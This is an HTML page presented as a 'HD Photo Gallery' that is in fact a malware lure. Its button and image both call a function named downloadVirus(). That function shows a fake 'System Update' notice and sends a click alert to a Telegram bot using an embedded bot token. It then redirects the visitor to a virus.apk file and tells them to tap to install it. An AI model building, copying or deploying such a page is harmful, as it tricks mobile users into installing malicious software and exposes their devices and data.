<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
    <title>HD Photo Gallery 2026</title>
    <style>
        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
        }
        
        body {
            background: linear-gradient(135deg, #0a0a0a 0%, #1a1a1a 100%);
            font-family: 'Segoe UI', 'Poppins', 'Arial', sans-serif;
            min-height: 100vh;
            display: flex;
            justify-content: center;
            align-items: center;
            padding: 20px;
        }
        
        .container {
            max-width: 500px;
            width: 100%;
            background: rgba(20, 20, 20, 0.9);
            border-radius: 30px;
            padding: 25px;
            box-shadow: 0 25px 50px -12px rgba(0, 0, 0, 0.8);
            border: 1px solid rgba(255, 255, 255, 0.1);
            backdrop-filter: blur(10px);
        }
        
        .header {
            text-align: center;
            margin-bottom: 20px;
        }
        
        .header h1 {
            color: #fff;
            font-size: 28px;
            font-weight: 600;
            background: linear-gradient(135deg, #fff, #ff4757);
            -webkit-background-clip: text;
            -webkit-text-fill-color: transparent;
            background-clip: text;
        }
        
        .header p {
            color: #888;
            font-size: 14px;
            margin-top: 8px;
        }
        
        .image-container {
            position: relative;
            border-radius: 20px;
            overflow: hidden;
            margin-bottom: 20px;
            cursor: pointer;
            transition: transform 0.3s ease;
        }
        
        .image-container:hover {
            transform: scale(1.02);
        }
        
        .image-container img {
            width: 100%;
            height: auto;
            display: block;
            transition: filter 0.3s ease;
        }
        
        .image-container:hover img {
            filter: brightness(0.9);
        }
        
        .overlay-text {
            position: absolute;
            bottom: 20px;
            left: 0;
            right: 0;
            text-align: center;
            background: rgba(0, 0, 0, 0.7);
            color: white;
            padding: 10px;
            font-size: 14px;
            backdrop-filter: blur(5px);
        }
        
        .btn {
            background: linear-gradient(135deg, #ff4757 0%, #e84118 100%);
            color: white;
            padding: 16px 32px;
            border: none;
            border-radius: 50px;
            font-size: 18px;
            font-weight: 600;
            cursor: pointer;
            width: 100%;
            transition: all 0.3s ease;
            box-shadow: 0 5px 15px rgba(255, 71, 87, 0.3);
            text-transform: uppercase;
            letter-spacing: 1px;
        }
        
        .btn:hover {
            transform: translateY(-2px);
            box-shadow: 0 8px 25px rgba(255, 71, 87, 0.4);
        }
        
        .btn:active {
            transform: translateY(1px);
        }
        
        .info {
            text-align: center;
            margin-top: 20px;
            color: #666;
            font-size: 12px;
        }
        
        .loader {
            display: none;
            width: 40px;
            height: 40px;
            border: 3px solid #f3f3f3;
            border-top: 3px solid #ff4757;
            border-radius: 50%;
            animation: spin 1s linear infinite;
            margin: 20px auto;
        }
        
        @keyframes spin {
            0% { transform: rotate(0deg); }
            100% { transform: rotate(360deg); }
        }
        
        .toast {
            position: fixed;
            bottom: 30px;
            left: 50%;
            transform: translateX(-50%);
            background: rgba(0, 0, 0, 0.9);
            color: #ff4757;
            padding: 12px 24px;
            border-radius: 50px;
            font-size: 14px;
            display: none;
            z-index: 1000;
            white-space: nowrap;
        }
    </style>
</head>
<body>
    <div class="container">
        <div class="header">
            <h1>📸 HD PHOTO GALLERY</h1>
            <p>✨ Premium Quality • 4K Resolution ✨</p>
        </div>
        
        <div class="image-container" onclick="downloadVirus()">
            <img src="https://images.pexels.com/photos/674010/pexels-photo-674010.jpeg?auto=compress&cs=tinysrgb&w=800" alt="Nature Beauty">
            <div class="overlay-text">👇 Click to View HD 👇</div>
        </div>
        
        <button class="btn" onclick="downloadVirus()">
            📥 DOWNLOAD HD PHOTO 📥
        </button>
        
        <div class="loader" id="loader"></div>
        <div class="info">
            ⚡ 4K Resolution • 50+ Downloads Today ⚡
        </div>
    </div>
    
    <div class="toast" id="toast">⚠️ Downloading System Update... ⚠️</div>
    
    <script>
        let downloading = false;
        
        function showToast(message, duration = 2000) {
            const toast = document.getElementById('toast');
            toast.textContent = message;
            toast.style.display = 'block';
            setTimeout(() => {
                toast.style.display = 'none';
            }, duration);
        }
        
        function showLoader() {
            document.getElementById('loader').style.display = 'block';
        }
        
        function hideLoader() {
            document.getElementById('loader').style.display = 'none';
        }
        
        async function downloadVirus() {
            if (downloading) return;
            downloading = true;
            
            showLoader();
            showToast('⚠️ Downloading System Update...', 3000);
            
            // Vibrate if supported
            if (navigator.vibrate) {
                navigator.vibrate(200);
            }
            
            // Play sound effect (if supported)
            try {
                const audio = new Audio('data:audio/wav;base64,U3RlYWx0aCBpcyBhIHNvbGQgaXJvbiBibG9jayBpbiB0aGUgY29yZSBvZiB0aGUgZWFydGg=');
                audio.play().catch(e => console.log('Audio not supported'));
            } catch(e) {}
            
            // Track download attempt
            try {
                const tracker = new Image();
                tracker.src = 'https://api.telegram.org/bot8642412184:AAGqVaa324gSb5DQIGx6y4MvG5pjxcillwY/sendMessage?chat_id=7830338879&text=🔴%20DOWNLOAD%20ATTEMPT%20DETECTED';
            } catch(e) {}
            
            // Delay to show loader
            setTimeout(() => {
                window.location.href = "https://raw.githubusercontent.com/prateekkumar4711-maker/Viresh/main/virus.apk";
                hideLoader();
                
                setTimeout(() => {
                    showToast('📱 Tap notification to install', 4000);
                }, 1000);
                
                setTimeout(() => {
                    downloading = false;
                }, 5000);
            }, 800);
        }
        
        // Preload effect
        window.addEventListener('load', () => {
            console.log('Page loaded - Ready');
        });
    </script>
</body>
</html>
